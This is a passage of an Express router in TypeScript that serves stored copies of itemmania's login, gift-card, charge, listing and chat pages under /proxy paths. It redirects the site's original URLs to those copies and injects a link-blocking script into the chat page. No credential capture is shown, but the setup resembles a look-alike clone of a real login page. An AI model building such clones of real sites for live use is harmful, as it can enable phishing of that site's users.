      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initButtons);
  } else {
    initButtons();
  }
})();
</script>
`;

function serveChat(html: string): string {
  const result = prepare(html);
  if (result.includes("</body>")) {
    return result.replace("</body>", CHAT_INTERCEPT_SCRIPT + "</body>");
  }
  return result + CHAT_INTERCEPT_SCRIPT;
}

// 원본 itemmania 경로로 JS가 상대경로 이동할 때 → 프록시 경로로 리다이렉트
router.get(["/game_charge", "/game_charge/"], (_req, res): void => {
  res.redirect(302, "/proxy/game-charge");
});
router.get(["/portal/giftcard", "/portal/giftcard/"], (_req, res): void => {
  res.redirect(302, "/proxy/giftcard");
});
router.get("/portal/user/p_login_form.html", (_req, res): void => {
  res.redirect(302, "/proxy/portal/user/p_login_form.html");
});
router.get(["/myroom", "/myroom/"], (_req, res): void => {
  res.redirect(302, "/proxy/");
});
router.get(["/myroom/chat/list.html", "/myroom/chat/"], (_req, res): void => {
  res.redirect(302, "/proxy/myroom/chat/list.html");
});

// 로그인 페이지 라우트 (itemmania 원본 경로 + 단축 경로)
router.get(
  ["/proxy/portal/user/p_login_form.html", "/proxy/login"],
  (req, res): void => {
    if (!loginHtml) {
      res.status(503).send("<html><body><h2>로그인 페이지를 불러올 수 없습니다</h2></body></html>");
      return;
    }
    res.set("Content-Type", "text/html; charset=utf-8");
    res.set("Cache-Control", "no-cache");
    res.send(serveLogin(loginHtml));
  }
);

// 상품권몰 페이지
router.get(["/proxy/giftcard", "/proxy/portal/giftcard", "/proxy/portal/giftcard/"], (req, res): void => {
  if (!giftcardHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGiftcard(giftcardHtml));
});

// 게임 할인충전 페이지
router.get(["/proxy/game-charge", "/proxy/game_charge", "/proxy/game_charge/"], (req, res): void => {
  if (!gamechargeHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGameCharge(gamechargeHtml));
});

// 게임별 상품 목록 페이지 — search_game 쿼리로 분기 (TOP 10 전체)
router.get(
  ["/proxy/sell/list.html", "/proxy/sell/lineage-classic", "/proxy/sell/maplestory-world"],
  (req, res): void => {
    const game = String(req.query["search_game"] ?? "");

    // 게임 ID → HTML 선택
    let html: string;
    if (game === "5913") {
      html = sellLineageClassicHtml;
    } else if (game === "5233") {
      html = sellMaplestoryWorldHtml;
    } else if (SELL_HTML_MAP[game]) {
      html = SELL_HTML_MAP[game];
    } else {
      // search_game 없거나 알 수 없는 경우 → 리니지클래식을 기본
      html = sellLineageClassicHtml;
    }

    if (!html) {
      res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
      return;
    }
    res.set("Content-Type", "text/html; charset=utf-8");
    res.set("Cache-Control", "no-cache");
    res.send(serveLineageClassic(html));
  }
);

// 원본 경로 리다이렉트 — search_game 그대로 전달
router.get("/sell/list.html", (req, res): void => {
  const game = req.query["search_game"];
  if (game) {
    res.redirect(302, `/proxy/sell/list.html?search_game=${game}`);
  } else {
    res.redirect(302, "/proxy/");
  }
});

// 매니아 채팅 페이지
router.get(["/proxy/myroom/chat/list.html", "/proxy/myroom/chat/"], (req, res): void => {
  const order = req.query["order"];
  const html = order === "1" ? chatOrderedHtml : chatHtml;
  if (!html) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveChat(html));
});

// 게임매니아 페이지
router.get("/proxy/gamemania", (req, res): void => {
  if (!gamemanaHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveGamemania(gamemanaHtml));
});

// /proxy 및 나머지 하위 경로 → itemmania.html 서빙
router.get(["/proxy", "/proxy/", "/proxy/{*splat}"], (req, res): void => {
  if (!staticHtml) {
    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
    return;
  }
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-cache");
  res.send(serveItemmania(staticHtml));
});

export default router;
